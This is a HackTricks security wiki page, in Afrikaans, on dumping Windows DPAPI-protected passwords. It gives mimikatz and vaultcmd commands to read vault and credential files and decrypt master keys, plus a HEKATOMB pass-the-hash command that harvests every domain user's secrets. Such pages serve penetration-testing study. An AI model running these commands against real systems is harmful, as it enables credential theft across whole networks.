# DPAPI - Uittreksel van Wagwoorde

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) is die mees relevante kuberveiligheid gebeurtenis in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n bruisende ontmoetingspunt vir tegnologie en kuberveiligheid professionele in elke dissipline.

{% embed url="https://www.rootedcon.com/" %}

## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **simmetriese versleuteling van simmetriese private sleutels**, wat óf gebruikers- of stelselsêls as 'n belangrike bron van entropie benut. Hierdie benadering vereenvoudig versleuteling vir ontwikkelaars deur hulle in staat te stel om data te versleutel met 'n sleutel wat afgelei is van die gebruiker se aanmeldsêls of, vir stelselsversleuteling, die stelsel se domeinverifikasiesêls, wat die behoefte aan ontwikkelaars om die beskerming van die versleuteling sleutel self te bestuur, uitskakel.

### Beskermde Data deur DPAPI

Onder die persoonlike data wat deur DPAPI beskerm word, is:

* Internet Explorer en Google Chrome se wagwoorde en outo-voltooi data
* E-pos en interne FTP rekening wagwoorde vir toepassings soos Outlook en Windows Mail
* Wagwoorde vir gedeelde vouers, hulpbronne, draadlose netwerke, en Windows Vault, insluitend versleuteling sleutels
* Wagwoorde vir afstandskantoorverbindinge, .NET Passport, en private sleutels vir verskeie versleuteling en verifikasiedoele
* Netwerk wagwoorde bestuur deur Credential Manager en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger, en meer

## Lys Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kredensiaal Lêers

Die **kredensiaal lêers wat beskerm word** kan geleë wees in:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Kry geloofsbriewe-inligting met behulp van mimikatz `dpapi::cred`, in die antwoord kan jy interessante inligting vind soos die versleutelde data en die guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
U kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te ontsleutel:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Meester Sleutels

Die DPAPI sleutels wat gebruik word om die gebruiker se RSA sleutels te enkripteer, word gestoor onder die `%APPDATA%\Microsoft\Protect\{SID}` gids, waar {SID} die [**Sekuriteitsidentifiseerder**](https://en.wikipedia.org/wiki/Security\_Identifier) **van daardie gebruiker** is. **Die DPAPI sleutel word in dieselfde lêer gestoor as die meester sleutel wat die gebruiker se private sleutels beskerm**. Dit is gewoonlik 64 bytes van ewekansige data. (Let daarop dat hierdie gids beskerm is, so jy kan dit nie lys met `dir` vanaf die cmd nie, maar jy kan dit lys vanaf PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dit is hoe 'n klomp Meester Sleutels van 'n gebruiker sal lyk:

![](<../../.gitbook/assets/image (1121).png>)

Gewoonlik **is elke meester sleutel 'n versleutelde simmetriese sleutel wat ander inhoud kan ontsleutel**. Daarom is dit **interessant om die **versleutelde Meester Sleutel** te **onttrek** om later daardie **ander inhoud** wat daarmee versleuteld is, te **ontsleutel**.

### Onttrek meester sleutel & ontsleutel

Kyk na die pos [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) vir 'n voorbeeld van hoe om die meester sleutel te onttrek en dit te ontsleutel.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) is 'n C# poort van sommige DPAPI funksionaliteit van [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) projek.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n hulpmiddel wat die onttrekking van alle gebruikers en rekenaars uit die LDAP gids en die onttrekking van domeinbeheerder rugsteun sleutel deur RPC outomatiseer. Die skrip sal dan alle rekenaars se IP-adresse oplos en 'n smbclient op alle rekenaars uitvoer om alle DPAPI blobs van alle gebruikers te verkry en alles met die domein rugsteun sleutel te ontsleutel.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die onttrekking van die LDAP rekenaarslys kan jy elke subnetwerk vind selfs al het jy nie daarvan geweet nie!

"Want Domein Admin regte is nie genoeg nie. Hack hulle almal."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan geheime wat deur DPAPI beskerm word outomaties dump.

## Verwysings

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) is die mees relevante kuberveiligheid gebeurtenis in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n bruisende ontmoetingspunt vir tegnologie en kuberveiligheid professionele in elke dissipline.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
